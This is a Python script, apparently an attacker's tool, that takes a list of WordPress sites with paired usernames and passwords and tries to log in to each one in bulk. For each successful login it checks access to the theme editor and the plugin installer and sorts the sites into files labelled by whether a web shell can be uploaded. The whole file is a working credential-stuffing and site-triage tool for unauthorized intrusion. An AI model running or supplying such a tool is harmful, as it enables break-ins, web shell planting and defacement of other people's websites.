#!/usr/bin/env python
# -*- coding: utf-8 -*-
#WP Theme / Plugin Installed Scanner
#Lust@af3z.my.id

import re, requests, os, sys
import sys
import os, re, requests
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
import json
from multiprocessing import Pool
from concurrent.futures import ThreadPoolExecutor
import requests, re, sys, threading, json
import threading
from multiprocessing.dummy import Pool
from queue import Queue
import json
import requests
import re
from platform import system	
from colorama import Fore		
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer						
from colorama import Style								
from pprint import pprint								
from colorama import init
import urllib.request
from bs4 import BeautifulSoup
import mechanize
from mechanize import Browser
import http.cookiejar as cookielib
import time

def wordpress(ek):
	session = requests.Session()
	if '://' not in ek:
		web = 'http://'+ek
	else:
		web = ek
	#web = "https://thisismaadi.com//wp-login.php#bpietak@12345678"
	try:
		tai = web.split('#')[1]
		tom = tai.split('@')
		username = tom[0]
		password = tom[1]
		#print(username+'|'+password)
		haik = web.split('/')[2]
		url = 'http://'+haik
		headers1 = {'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
		data = {'log':username,
				'pwd':password,
				'redirect_to':url+'/wp-admin/',
				'testcookie':'1',
				'wp-submit':'Log+In'}

		gasken = session.post(web, data=data, headers=headers1, timeout=10)
		tol = re.findall(r'<title>(.*?)</title>', gasken.text)
		if 'wp-menu-name' in gasken.text:
			print('[ + ] Success Log In {}' .format(web))
			dong = session.get(url+'/wp-admin/theme-editor.php', timeout=15)
			#print(dong.status_code)
			if dong.status_code == 200:
				print('[ + ] Theme editor OK')
				dong2=session.get(url+'/wp-admin/plugin-install.php', timeout=15)
				if dong2.status_code == 200:
					print('[ + ] Plugin can Install OK')
					print('')
					open('can_install_all.txt', 'a').write(web+'\n')
				else:
					open('just_theme_install.txt', 'a').write(web+'\n')
					print('[ + ] Cant install Plugin')
					print('')


			else:
				dong2=session.get(url+'/wp-admin/plugin-install.php', timeout=15)
				if dong2.status_code == 200:
					print('[ + ] Plugin can Install OK')
					open('just_plugin_install.txt', 'a').write(web+'\n')
					print('')
				else:
					print('[ + ] Just User WordPress')
					print('')
					if 'WP File Manager' in gasken.text:
						print('[ + ] WP Filemanager Installed {}' .format(web))
						print('WP Filemanager.txt', 'a').write(web+'\n')
					else:
						user = session.get(url+'/wp-admin/edit.php', timeout=10)
						open('just_user.txt', 'a').write(web+'\n')
						if user.status_code == 200:
							print('[ + ] Can Posting ! {} ' .format(web))
							open('posting.txt', 'a').write(web+'\n')
						else:
							print('[ + ] Web Cupu ! {}' .format(web))

		else:
			sekarang = time.time()
			infowaktu = time.localtime(sekarang)
			kampret= str(infowaktu[3])+":"+str(infowaktu[4])+":"+str(infowaktu[5])
			sukses=[]
			brows = Browser()
			brows.set_handle_robots(False)
			cokie = cookielib.LWPCookieJar()
			brows.set_handle_equiv(True)
			brows.set_handle_gzip(True)
			brows.set_handle_redirect(True)
			brows.set_handle_referer(True)
			brows.set_cookiejar(cokie)
			brows._factory.is_html = True
			brows.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)')]
			brows.open(web, timeout=5)
			brows.select_form(nr=0)
			brows.form['log']=username
			brows.form['pwd']=password
			brows.method='POST'
			brows.submit()
			yow = (brows.response().read().decode("UTF-8"))
			crazy = re.findall(r'<title>(.*?)</title>',yow)
			if 'wp-menu-name' in yow:
				#print('{}{} ..... {}VULN' .format(fb,vuln2,fg))
				print('[ + ] Succed Login Mechanize {}' .format(web))
				open('VULN_WPmechanize.txt', 'a').write(web+'\n')

				#reak
			else:
				#print('{}{} ..... {}NOT VULN' .format(fb,vuln2,fr))
				print('[ - ] Failed Login {}' .format(web))
			#print(tol)
	except Exception as e:
		#pass
		print('{} --> ERROR' .format(web))
if __name__ == '__main__':
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""
███████╗███████╗██████╗ ██╗███████╗ █████╗ ██╗    ██╗ █████╗ 
██╔════╝██╔════╝██╔══██╗██║╚══███╔╝██╔══██╗██║    ██║██╔══██╗
███████╗█████╗  ██████╔╝██║  ███╔╝ ███████║██║ █╗ ██║███████║
╚════██║██╔══╝  ██╔══██╗██║ ███╔╝  ██╔══██║██║███╗██║██╔══██║
███████║███████╗██║  ██║██║███████╗██║  ██║╚███╔███╔╝██║  ██║
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝
															 
Contact me : https://www.facebook.com/zekkel.ar.1
__Author__ : Zekkel AR - Serizawa@Familyattackcyber.net
	""")
	mmc = input(' LIST : ')

	a = open(mmc, 'r').read().splitlines()
	ThreadPool = Pool(200)
	Threads = ThreadPool.map(wordpress, a)
	print('')
	try:
		a = open('can_install_all.txt', 'r').readlines()
		asik = (len(a))
		print('[ DonYoku ] Can upshell : {}' .format(asik))
	except Exception as e:
		print('[ DonYoku ] Can upload shell : 0')

	try:
		b = open('posting.txt', 'r').readlines()
		asik2 = (len(b))
		print('[ DonYoku ] Only Add post : {}' .format(asik2))
	except Exception as e:
		print('[ DonYoku ] Only add post : 0')

	try: 
		c = open('VULN_WPmechanize.txt', 'r').readlines()
		asik3 = (len(c))
		print('[ DonYoku ] Unique Log+in : {}' .format(asik))
	except Exception as e:
		print('[ DonYoku ] Unique login : 0')

	try:
		d = open('just_plugin_install.txt', 'r').readlines()
		asik4 = (len(d))
		print('[ DonYoku ] Only Plugin upshell : {}' .format(asik4))
	except Exception as e:
		print('[ DonYoku ] Only plugin upshell : 0')

	try:
		e = open('just_theme_install.txt', 'r').readlines()
		asik5 = len(e)
		print('[ DonYoku ] Only Theme upshell : {}' .format(asik5))
	except Exception as e:
		print('[ DonYoku ] Only Theme upshell : 0')

	try:
		d = open('just_user.txt', 'r').readlines()
		asik6 = (len(d))
		print('[ DonYoku ] Only user : {}' .format(asik6)) 
	except Exception as e:
		print('[ DonYoku ] Only user : 0')


